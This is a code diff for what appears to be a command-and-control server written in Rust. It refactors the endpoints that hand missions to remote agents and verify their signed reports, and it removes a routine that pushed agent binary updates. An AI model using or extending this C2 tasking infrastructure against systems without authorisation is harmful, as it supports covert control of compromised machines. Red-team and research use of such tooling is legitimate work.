@@ -1,5 +1,10 @@
-use axum::{extract::{Path, State}, http::StatusCode, response::IntoResponse, Json};
-use common::{crypto, model::{self, Mission}};
+use axum::{
+    extract::{Path, State},
+    http::StatusCode,
+    response::IntoResponse,
+    Json,
+};
+use common::model::{self, Mission};
 use tracing::{debug, error, warn};
 
 use crate::{routes::AGENT_NOT_FOUND, services, C2State};
@@ -27,20 +32,19 @@ pub async fn get_next(
         return (StatusCode::UNAUTHORIZED).into_response();
     }
 
-    let agent = match services::agents::get_by_identity(
-        c2_state.conn.clone(),
-        crypto_negociation.identity.to_bytes(),
-    ) {
-        Ok(Some(agent)) => agent,
-        Ok(None) => {
-            warn!("Agent not found");
-            return (StatusCode::NOT_FOUND, AGENT_NOT_FOUND).into_response();
-        }
-        Err(e) => {
-            error!("{e}");
-            return (StatusCode::INTERNAL_SERVER_ERROR).into_response();
-        }
-    };
+    let agent =
+        match services::agents::get_by_identity(c2_state.conn.clone(), crypto_negociation.identity)
+        {
+            Ok(Some(agent)) => agent,
+            Ok(None) => {
+                warn!("Agent not found");
+                return (StatusCode::NOT_FOUND, AGENT_NOT_FOUND).into_response();
+            }
+            Err(e) => {
+                error!("{e}");
+                return (StatusCode::INTERNAL_SERVER_ERROR).into_response();
+            }
+        };
 
     let mission = match services::missions::poll_next(c2_state.conn.clone(), agent.id).await {
         Ok(Some(m)) => m,
@@ -54,23 +58,6 @@ pub async fn get_next(
         }
     };
 
-    // TODO Create a proper to store & deliver agent versions
-    let mission = if let model::Mission {
-        task: model::Task::Update(_),
-        ..
-    } = mission
-    {
-        // let agent_bin =
-        //     std::fs::read("target/x86_64-pc-windows-gnu/release/agent.exe").unwrap();
-        let agent_bin = std::fs::read("target/release/agent").unwrap();
-        model::Mission {
-            task: model::Task::Update(agent_bin),
-            ..mission
-        }
-    } else {
-        mission
-    };
-    //
     debug!("{mission}");
     let mission = serde_json::to_vec(&mission).unwrap();
 
@@ -137,9 +124,7 @@ pub async fn report(
         }
     };
 
-    if let Err(e) =
-        crypto_message.verify(&crypto::VerifyingKey::from_bytes(&agent.identity).unwrap())
-    {
+    if let Err(e) = crypto_message.verify(&agent.identity) {
         error!("{e}");
         return (StatusCode::UNAUTHORIZED).into_response();
     }
